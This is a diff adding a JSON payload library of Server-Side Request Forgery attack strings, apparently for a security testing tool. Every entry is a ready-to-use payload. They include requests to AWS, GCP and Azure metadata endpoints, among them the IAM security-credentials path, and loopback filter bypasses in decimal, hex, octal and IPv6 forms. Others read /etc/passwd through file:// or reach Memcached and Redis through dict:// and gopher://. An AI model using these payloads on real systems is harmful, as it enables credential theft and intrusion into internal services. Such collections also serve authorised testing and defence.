@@ -1,0 +1,283 @@
+{
+    "category": "SSRF",
+    "description": "Server-Side Request Forgery payloads for internal network access and cloud metadata",
+    "payloads": [
+        {
+            "id": "ssrf-basic-001",
+            "title": "Localhost HTTP",
+            "payload": "http://localhost/",
+            "category": "SSRF",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "localhost",
+                "http"
+            ],
+            "notes": "Basic localhost access",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-basic-002",
+            "title": "127.0.0.1",
+            "payload": "http://127.0.0.1/",
+            "category": "SSRF",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "loopback",
+                "ip"
+            ],
+            "notes": "Loopback IP address",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-basic-003",
+            "title": "Internal Admin Panel",
+            "payload": "http://127.0.0.1/admin",
+            "category": "SSRF",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "admin",
+                "internal",
+                "panel"
+            ],
+            "notes": "Access internal admin panel",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-cloud-001",
+            "title": "AWS Metadata v1",
+            "payload": "http://169.254.169.254/latest/meta-data/",
+            "category": "SSRF",
+            "subcategory": "Cloud Metadata",
+            "context": [
+                "url",
+                "aws"
+            ],
+            "level": "high",
+            "tags": [
+                "aws",
+                "metadata",
+                "cloud"
+            ],
+            "notes": "AWS EC2 instance metadata",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-cloud-002",
+            "title": "AWS IAM Credentials",
+            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "category": "SSRF",
+            "subcategory": "Cloud Metadata",
+            "context": [
+                "url",
+                "aws"
+            ],
+            "level": "high",
+            "tags": [
+                "aws",
+                "iam",
+                "credentials"
+            ],
+            "notes": "AWS IAM role credentials",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-cloud-003",
+            "title": "GCP Metadata",
+            "payload": "http://metadata.google.internal/computeMetadata/v1/",
+            "category": "SSRF",
+            "subcategory": "Cloud Metadata",
+            "context": [
+                "url",
+                "gcp"
+            ],
+            "level": "high",
+            "tags": [
+                "gcp",
+                "metadata",
+                "cloud"
+            ],
+            "notes": "Google Cloud metadata (requires header)",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-cloud-004",
+            "title": "Azure Metadata",
+            "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "category": "SSRF",
+            "subcategory": "Cloud Metadata",
+            "context": [
+                "url",
+                "azure"
+            ],
+            "level": "high",
+            "tags": [
+                "azure",
+                "metadata",
+                "cloud"
+            ],
+            "notes": "Azure instance metadata",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-bypass-001",
+            "title": "Decimal IP",
+            "payload": "http://2130706433/",
+            "category": "SSRF",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "decimal",
+                "ip"
+            ],
+            "notes": "127.0.0.1 in decimal format",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-bypass-002",
+            "title": "Hex IP",
+            "payload": "http://0x7f000001/",
+            "category": "SSRF",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "hex",
+                "ip"
+            ],
+            "notes": "127.0.0.1 in hex format",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-bypass-003",
+            "title": "IPv6 Localhost",
+            "payload": "http://[::1]/",
+            "category": "SSRF",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "ipv6",
+                "localhost"
+            ],
+            "notes": "IPv6 loopback address",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-bypass-004",
+            "title": "Octal IP",
+            "payload": "http://0177.0.0.1/",
+            "category": "SSRF",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "octal",
+                "ip"
+            ],
+            "notes": "Octal IP representation",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-bypass-005",
+            "title": "DNS Rebinding",
+            "payload": "http://localtest.me/",
+            "category": "SSRF",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "dns",
+                "rebinding"
+            ],
+            "notes": "localtest.me resolves to 127.0.0.1",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-protocol-001",
+            "title": "File Protocol",
+            "payload": "file:///etc/passwd",
+            "category": "SSRF",
+            "subcategory": "Protocol",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "file",
+                "protocol",
+                "lfi"
+            ],
+            "notes": "Read local files via file://",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-protocol-002",
+            "title": "Dict Protocol",
+            "payload": "dict://localhost:11211/stat",
+            "category": "SSRF",
+            "subcategory": "Protocol",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "dict",
+                "protocol",
+                "memcached"
+            ],
+            "notes": "Access Memcached via dict://",
+            "source": "github"
+        },
+        {
+            "id": "ssrf-protocol-003",
+            "title": "Gopher Redis",
+            "payload": "gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
+            "category": "SSRF",
+            "subcategory": "Protocol",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "gopher",
+                "protocol",
+                "redis"
+            ],
+            "notes": "Access Redis via gopher://",
+            "source": "github"
+        }
+    ]
+}
